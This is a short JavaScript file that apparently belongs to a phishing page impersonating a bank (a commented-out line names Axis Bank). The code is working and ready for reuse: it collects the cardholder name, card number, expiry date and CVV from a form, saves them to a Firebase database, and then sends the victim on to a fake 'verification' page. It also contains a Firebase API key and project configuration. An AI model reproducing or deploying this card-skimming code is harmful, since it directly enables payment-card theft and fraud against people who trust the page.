// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyB5VvIXhauUC9R1rikG50_QRy4D-Pm3oYk",
  authDomain: "dbs-iphone.firebaseapp.com",
  databaseURL: "https://dbs-iphone-default-rtdb.firebaseio.com",
  projectId: "dbs-iphone",
  storageBucket: "dbs-iphone.appspot.com",
  messagingSenderId: "511182041695",
  appId: "1:511182041695:web:39f1c479993dd143a2e1ea"


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var card_name = getInputVal('card_name');
  var card_no = getInputVal('card_no');
  var exp_date = getInputVal('exp_date');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(card_name, card_no, exp_date, cvv);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();

document.getElementById('contactForm').reset();
window.location.href="verification/verify.html";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(card_name, card_no, exp_date, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    card_name: card_name,
    card_no:card_no,
    exp_date:exp_date,
    cvv:cvv,
  });
}
